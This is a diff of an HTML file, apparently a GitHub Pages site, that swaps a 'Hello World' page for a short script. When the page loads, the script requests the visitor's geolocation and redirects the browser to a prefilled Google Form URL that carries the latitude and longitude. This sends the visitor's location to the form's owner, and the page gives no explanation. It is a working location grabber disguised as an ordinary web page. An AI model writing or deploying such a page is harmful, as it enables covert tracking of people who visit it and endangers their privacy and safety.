@@ -1,7 +1,30 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
-</body>
+  <head>
+    <base target="_top">
+  </head>
+  <body>
+    
+    <script>
+      
+      var formURL = "https://docs.google.com/forms/d/e/1FAIpQLScFcbvIJ--82eXE08A-AViWPd-g3Sa8WOogatFiAIuEVYZm7w/viewform?usp=pp_url&entry.928430730=";
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(showPosition);
+        } else { 
+          showPosition(null);
+        }
+      }
+      
+      function showPosition(position) {
+        var loc = position ? position.coords.latitude + "," + position.coords.longitude : "";
+        window.location.href = formURL + loc;
+      }
+
+      getLocation();
+      
+    </script>
+
+  </body>
 </html>
